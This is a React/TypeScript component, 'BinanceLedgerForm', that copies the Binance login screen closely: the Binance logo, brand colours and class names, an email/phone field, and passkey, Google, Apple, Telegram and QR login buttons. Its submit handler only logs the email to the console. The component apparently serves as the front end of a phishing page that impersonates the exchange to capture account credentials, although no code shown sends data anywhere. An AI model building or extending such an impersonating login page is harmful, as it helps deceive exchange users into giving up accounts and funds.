
import { FC, useState } from "react";
import { useToast } from "@/hooks/use-toast";

const BinanceLedgerForm: FC = () => {
  const { toast } = useToast();
  const [email, setEmail] = useState("");

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    console.log("Form submitted with email:", email);
  };

  return (
    <div 
      className="min-h-screen flex items-center justify-center p-4"
      style={{
        background: "var(--color-BasicBg, #181A20)",
        fontFamily: "BinanceNova, Arial, sans-serif",
        color: "var(--color-PrimaryText, #EAECEF)"
      }}
    >
      <div 
        className="content-card first-screen-content"
        style={{
          border: "1px solid var(--color-Line, #2B3139)",
          borderRadius: "24px",
          minHeight: "580px",
          padding: "40px",
          width: "425px",
          backgroundColor: "var(--color-CardBg, #1E2329)"
        }}
      >
        {/* Binance Logo */}
        <div className="icon-wrap mb-8">
          <svg 
            height="24" 
            width="120" 
            className="bn-svg default-icon block mx-auto" 
            viewBox="0 0 120 24" 
            xmlns="http://www.w3.org/2000/svg"
          >
            <path 
              fill="#F0B90B" 
              d="M5.41406 12L2.71875 14.6953L0 12L2.71875 9.28125L5.41406 12ZM12 5.41406L16.6406 10.0547L19.3594 7.33594L12 0L4.64062 7.35938L7.35938 10.0781L12 5.41406ZM21.2812 9.28125L18.5859 12L21.3047 14.7188L24.0234 12L21.2812 9.28125ZM12 18.5859L7.35938 13.9219L4.64062 16.6406L12 24L19.3594 16.6406L16.6406 13.9219L12 18.5859ZM12 14.6953L14.7188 11.9766L12 9.28125L9.28125 12L12 14.6953ZM40.5938 14.9766V14.9297C40.5938 13.1719 39.6562 12.2812 38.1328 11.6953C39.0703 11.1797 39.8672 10.3359 39.8672 8.85938V8.8125C39.8672 6.75 38.2031 5.41406 35.5312 5.41406H29.4141V18.5625H35.6719C38.6484 18.5859 40.5938 17.3672 40.5938 14.9766ZM36.9844 9.35156C36.9844 10.3359 36.1875 10.7344 34.8984 10.7344H32.2266V7.94531H35.0859C36.3047 7.94531 36.9844 8.4375 36.9844 9.30469V9.35156ZM37.7109 14.6016C37.7109 15.5859 36.9375 16.0312 35.6719 16.0312H32.2266V13.1484H35.5781C37.0547 13.1484 37.7109 13.6875 37.7109 14.5781V14.6016ZM46.6641 18.5625V5.41406H43.7578V18.5625H46.6641ZM62.2266 18.5859V5.41406H59.3672V13.5234L53.2031 5.41406H50.5312V18.5625H53.3906V10.2188L59.7656 18.5859H62.2266ZM78.2578 18.5859L72.6094 5.34375H69.9375L64.2891 18.5859H67.2656L68.4609 15.6328H74.0156L75.2109 18.5859H78.2578ZM72.9844 13.0781H69.4922L71.25 8.8125L72.9844 13.0781ZM92.0625 18.5859V5.41406H89.2031V13.5234L83.0391 5.41406H80.3672V18.5625H83.2266V10.2188L89.6016 18.5859H92.0625ZM106.992 16.4531L105.141 14.6016C104.109 15.5391 103.195 16.1484 101.672 16.1484C99.4219 16.1484 97.8516 14.2734 97.8516 12.0234V11.9531C97.8516 9.70312 99.4453 7.85156 101.672 7.85156C102.984 7.85156 104.016 8.41406 105.047 9.32812L106.898 7.19531C105.68 6 104.203 5.15625 101.719 5.15625C97.6875 5.15625 94.8516 8.22656 94.8516 11.9531V12C94.8516 15.7734 97.7344 18.7734 101.602 18.7734C104.133 18.7969 105.633 17.9062 106.992 16.4531ZM119.344 18.5625V16.0078H112.195V13.2422H118.406V10.6641H112.195V7.99219H119.25V5.41406H109.336V18.5625H119.344Z"
            />
          </svg>
        </div>

        {/* Header with QR Code Icon */}
        <div className="flex justify-between items-center mb-8">
          <div 
            className="card-page-title !mb-[0px] text-2xl font-semibold" 
            role="heading" 
            aria-level="1"
            style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
          >
            Log in
          </div>
          <div className="max-md:hidden h-[40px]">
            <div className="bn-tooltips-wrap qrcode-login-popup">
              <div className="bn-tooltips-ele">
                <div 
                  className="p-[4px] w-[40px] h-[40px] rounded-[8px] cursor-pointer qr-login-icon transition-colors"
                  style={{
                    backgroundColor: "var(--color-Vessel, #1E2329)",
                    "&:hover": { backgroundColor: "var(--color-Input, #2B3139)" }
                  }}
                  role="button" 
                  aria-label="QR code login" 
                  tabIndex={0}
                >
                  <svg 
                    className="w-[32px] h-[32px]" 
                    style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
                    viewBox="0 0 24 24" 
                    xmlns="http://www.w3.org/2000/svg"
                    fill="currentColor"
                  >
                    <path fillRule="evenodd" clipRule="evenodd" d="M9.5 9.5V3H3v6.5h6.5zm1 1.5H2a.5.5 0 01-.5-.5V2a.5.5 0 01.5-.5h8.5a.5.5 0 01.5.5v8.5a.5.5 0 01-.5.5z" />
                    <path d="M4.884 5.035h2.581v2.58h-2.58v-2.58zM4.884 16.535h2.581v2.58h-2.58v-2.58z" />
                    <path fillRule="evenodd" clipRule="evenodd" d="M9.5 21v-6.5H3V21h6.5zm1 1.5H2a.5.5 0 01-.5-.5v-8.5A.5.5 0 012 13h8.5a.5.5 0 01.5.5V22a.5.5 0 01-.5.5zM21 9.5V3h-6.5v6.5H21zm1 1.5h-8.5a.5.5 0 01-.5-.5V2a.5.5 0 01.5-.5H22a.5.5 0 01.5.5v8.5a.5.5 0 01-.5.5z" />
                    <path d="M16.535 5.035h2.58v2.58h-2.58v-2.58zM15.5 22.5V20H13v2.5h2.5z" />
                    <path fillRule="evenodd" clipRule="evenodd" d="M15.5 18v-2.5H18V13h-5v5h2.5zM22.5 20H20v-2.5h-2.5v5h5V20z" />
                    <path d="M22.5 15.5V13H20v2.5h2.5z" />
                  </svg>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Login Form */}
        <form onSubmit={handleSubmit}>
          <div className="bn-formItem mb-6">
            <label 
              className="bn-formItem-label block mb-2 text-sm font-medium" 
              htmlFor="bn-formItem-q8nY2Y1v"
              style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
            >
              Email/Phone number
            </label>
            <div>
              <div className="css-4cffwv">
                <div 
                  className="bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded"
                  style={{
                    backgroundColor: "var(--color-Input, #2B3139)",
                    border: "1px solid var(--color-InputLine, #474D57)"
                  }}
                  role="group"
                >
                  <input
                    placeholder="Email/Phone (without country code)"
                    type="text"
                    role="textbox"
                    aria-label="Username field for email or phone number"
                    name="username"
                    autoFocus
                    id="bn-formItem-q8nY2Y1v"
                    autoCapitalize="off"
                    className="bn-textField-input !w-[inherit] bg-transparent border-0 text-white p-3 w-full outline-none"
                    style={{
                      color: "var(--color-PrimaryText, #EAECEF)",
                      "::placeholder": { color: "var(--color-TertiaryText, #848E9C)" }
                    }}
                    spellCheck="false"
                    autoComplete="username"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                  />
                </div>
              </div>
            </div>
          </div>

          <button
            className="bn-button bn-button__primary data-size-large mt-6 w-full py-3 rounded font-semibold transition-colors"
            style={{
              backgroundColor: "var(--color-BtnBg, #FCD535)",
              color: "var(--color-TextOnYellow, #202630)"
            }}
            type="submit"
            aria-label="Next"
          >
            Next
          </button>
        </form>

        {/* Divider */}
        <div className="my-4 flex items-center md:mb-2 md:mt-6">
          <div 
            className="h-[1px] flex-1" 
            style={{ backgroundColor: "var(--color-Line, #2B3139)" }}
          />
          <div 
            className="px-4 text-sm"
            style={{ color: "var(--color-TertiaryText, #848E9C)" }}
          >
            or
          </div>
          <div 
            className="h-[1px] flex-1" 
            style={{ backgroundColor: "var(--color-Line, #2B3139)" }}
          />
        </div>

        {/* Social Login Buttons */}
        <div className="space-y-3">
          {/* Passkey Button */}
          <button 
            className="bn-button bn-button__icon bn-button__icon__line data-size-large bids_icon-button mb-3 md:mb-4 w-full py-3 rounded flex items-center justify-center transition-colors"
            style={{
              backgroundColor: "transparent",
              border: "1px solid var(--color-InputLine, #474D57)",
              color: "var(--color-PrimaryText, #EAECEF)"
            }}
            role="button" 
            aria-label="Continue with Passkey"
          >
            <div className="icon-warp mr-3">
              <div className="ml-1 h-[20px]">
                <svg 
                  className="bn-svg h-[20px] w-[20px]" 
                  style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
                  viewBox="0 0 24 24" 
                  xmlns="http://www.w3.org/2000/svg"
                  fill="currentColor"
                >
                  <path fillRule="evenodd" clipRule="evenodd" d="M1.5 17c0-2.9 2.35-5.25 5.25-5.25h3c2.9 0 5.25 2.35 5.25 5.25v4a.75.75 0 01-1.5 0v-4a3.75 3.75 0 00-3.75-3.75h-3A3.75 3.75 0 003 17v4a.75.75 0 01-1.5 0v-4zM8.25 9a3 3 0 100-6 3 3 0 000 6zm0 1.5a4.5 4.5 0 100-9 4.5 4.5 0 000 9zM18.536 11.923a.75.75 0 00-.75.75v5.138a.75.75 0 001.5 0v-5.138a.75.75 0 00-.75-.75z" />
                  <path fillRule="evenodd" clipRule="evenodd" d="M17.786 16.041c0 .414.336.75.75.75h2.167a.75.75 0 000-1.5h-2.167a.75.75 0 00-.75.75zM16.75 10.15a1.773 1.773 0 113.545 0 1.773 1.773 0 01-3.545 0zm1.773-3.272a3.273 3.273 0 100 6.545 3.273 3.273 0 000-6.545z" />
                </svg>
              </div>
            </div>
            <div>Continue with Passkey</div>
          </button>

          {/* Google Button */}
          <button 
            className="bn-button bn-button__icon bn-button__icon__line data-size-large bids_icon-button w-full py-3 rounded flex items-center justify-center transition-colors"
            style={{
              backgroundColor: "transparent",
              border: "1px solid var(--color-InputLine, #474D57)",
              color: "var(--color-PrimaryText, #EAECEF)"
            }}
            role="button" 
            aria-label="Continue with Google"
          >
            <div className="icon-warp mr-3">
              <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="bn-svg">
                <g clipPath="url(#clip0_2445_976)">
                  <path fillRule="evenodd" clipRule="evenodd" d="M19.68 12.1818C19.68 11.6146 19.6291 11.0691 19.5345 10.5455H12V13.64H16.3055C16.12 14.64 15.5564 15.4873 14.7091 16.0546V18.0618H17.2945C18.8073 16.6691 19.68 14.6182 19.68 12.1818Z" fill="#4285F4" />
                  <path fillRule="evenodd" clipRule="evenodd" d="M11.9997 20C14.1597 20 15.9706 19.2836 17.2942 18.0618L14.7088 16.0545C13.9924 16.5345 13.076 16.8182 11.9997 16.8182C9.91604 16.8182 8.1524 15.4109 7.52331 13.52H4.85059V15.5927C6.16695 18.2073 8.8724 20 11.9997 20Z" fill="#34A853" />
                  <path fillRule="evenodd" clipRule="evenodd" d="M7.52364 13.52C7.36364 13.04 7.27273 12.5273 7.27273 12C7.27273 11.4727 7.36364 10.96 7.52364 10.48V8.40729H4.85091C4.30909 9.48729 4 10.7091 4 12C4 13.2909 4.30909 14.5127 4.85091 15.5927L7.52364 13.52Z" fill="#FBBC05" />
                  <path fillRule="evenodd" clipRule="evenodd" d="M11.9997 7.18182C13.1742 7.18182 14.2288 7.58545 15.0579 8.37818L17.3524 6.08364C15.9669 4.79273 14.156 4 11.9997 4C8.8724 4 6.16695 5.79273 4.85059 8.40727L7.52331 10.48C8.1524 8.58909 9.91604 7.18182 11.9997 7.18182Z" fill="#EA4335" />
                </g>
                <defs>
                  <clipPath id="clip0_2445_976">
                    <rect width="16" height="16" fill="none" transform="translate(4 4)" />
                  </clipPath>
                </defs>
              </svg>
            </div>
            <div>Continue with Google</div>
          </button>

          {/* Apple Button */}
          <button 
            className="bn-button bn-button__icon bn-button__icon__line data-size-large bids_icon-button w-full py-3 rounded flex items-center justify-center transition-colors"
            style={{
              backgroundColor: "transparent",
              border: "1px solid var(--color-InputLine, #474D57)",
              color: "var(--color-PrimaryText, #EAECEF)"
            }}
            role="button" 
            aria-label="Continue with Apple"
          >
            <div className="icon-warp mr-3">
              <svg 
                width="24" 
                height="24" 
                xmlns="http://www.w3.org/2000/svg" 
                className="bn-svg" 
                style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
                viewBox="0 0 24 24"
                fill="currentColor"
              >
                <path fillRule="evenodd" clipRule="evenodd" d="M15.0756 3.64877C15.1861 4.6061 14.7876 5.54843 14.204 6.24214C13.5956 6.92442 12.6209 7.44595 11.6726 7.37879C11.5485 6.45861 12.0291 5.47913 12.5668 4.88187C13.1752 4.20317 14.231 3.68378 15.0756 3.64877ZM18.1084 8.79019C17.9965 8.85395 16.2493 9.84885 16.2687 11.8728C16.2905 14.3233 18.5248 15.1327 18.5511 15.1413C18.5384 15.1985 18.2014 16.3101 17.3644 17.4389C16.665 18.4327 15.931 19.4043 14.7676 19.4214C14.2139 19.4337 13.8401 19.2824 13.4506 19.1248C13.0443 18.9604 12.621 18.7892 11.9587 18.7892C11.2566 18.7892 10.8144 18.9661 10.3881 19.1366C10.0194 19.2841 9.66254 19.4269 9.15964 19.4464C8.05113 19.4857 7.20358 18.3855 6.47861 17.401C5.03018 15.3906 3.90212 11.7342 5.41447 9.24657C6.14771 8.02633 7.48409 7.24118 8.91222 7.21974C9.5412 7.2076 10.1446 7.43792 10.6735 7.63982C11.0781 7.79423 11.439 7.93203 11.7346 7.93203C11.9946 7.93203 12.3456 7.79969 12.7547 7.64548C13.3989 7.40262 14.1871 7.10549 14.9902 7.18545C15.5392 7.20045 17.1035 7.39121 18.1112 8.78862L18.1084 8.79019Z" />
              </svg>
            </div>
            <div>Continue with Apple</div>
          </button>

          {/* Telegram Button */}
          <button 
            className="bn-button bn-button__icon bn-button__icon__line data-size-large bids_icon-button mt-4 w-full py-3 rounded flex items-center justify-center transition-colors"
            style={{
              backgroundColor: "transparent",
              border: "1px solid var(--color-InputLine, #474D57)",
              color: "var(--color-PrimaryText, #EAECEF)"
            }}
            role="button" 
            aria-label="Continue with Telegram"
          >
            <div className="icon-warp mr-3">
              <svg height="24" width="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" className="bn-svg">
                <path d="M2.81274 9.27228C7.28665 7.32306 10.27 6.03802 11.7627 5.41715C16.0247 3.64445 16.9103 3.33651 17.4875 3.32634C17.6144 3.3241 17.8983 3.35557 18.0822 3.50477C18.2374 3.63075 18.2801 3.80094 18.3006 3.92038C18.321 4.03983 18.3465 4.31192 18.3263 4.52453C18.0953 6.95123 17.0959 12.8402 16.5875 15.5581C16.3724 16.7082 15.9488 17.0938 15.5387 17.1315C14.6475 17.2136 13.9707 16.5426 13.1076 15.9767C11.7568 15.0913 10.9938 14.5401 9.68265 13.6761C8.16744 12.6776 9.14969 12.1288 10.0132 11.232C10.2392 10.9972 14.1659 7.42557 14.2419 7.10157C14.2514 7.06104 14.2603 6.90999 14.1705 6.83024C14.0808 6.75048 13.9483 6.77775 13.8528 6.79944C13.7173 6.83019 11.5595 8.25641 7.37938 11.0781C6.7669 11.4987 6.21213 11.7036 5.71508 11.6929C5.16711 11.681 4.11306 11.383 3.32947 11.1283C2.36838 10.8159 1.60451 10.6507 1.67103 10.1202C1.70568 9.84381 2.08624 9.56118 2.81274 9.27228Z" fill="#00AEED" />
              </svg>
            </div>
            <div>Continue with Telegram</div>
          </button>
        </div>
      </div>
    </div>
  );
};

export default BinanceLedgerForm;
